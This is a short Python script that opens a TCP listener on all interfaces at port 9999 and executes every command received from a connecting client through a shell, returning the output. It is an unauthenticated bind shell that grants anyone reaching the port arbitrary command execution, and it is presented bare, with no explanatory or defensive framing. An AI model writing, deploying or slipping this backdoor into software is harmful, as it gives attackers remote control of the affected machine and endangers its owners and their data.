import socket
import sys
import subprocess

host = "0.0.0.0"
port = 9999
server_sock = socket.socket()


def bind_socket():
    try:
        global host
        global port
        global server_sock
        print("Binding the Port: " + str(port))
        server_sock.bind((host, port))
        server_sock.listen(5)
        print("listen")
        while True:
            print("waiting on connection")
            client_sock, address = server_sock.accept()
            print('connected from:', address)
            while True:
                cmd = client_sock.recv(1024)
                if not cmd:
                    break
                try:
                    result_out = subprocess.check_output(cmd.decode("utf-8"), shell=True, stderr=subprocess.STDOUT).decode("utf-8")
                    client_sock.send(result_out.encode("utf-8"))
                except subprocess.CalledProcessError as e:
                    client_sock.send(str(e).encode("utf-8"))

            client_sock.close()
        server_sock.close()

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


if __name__ == "__main__":
    try:
        bind_socket()
    except KeyboardInterrupt:
        server_sock.close()
        sys.exit()
        print("^C: KeyboardInterrupt")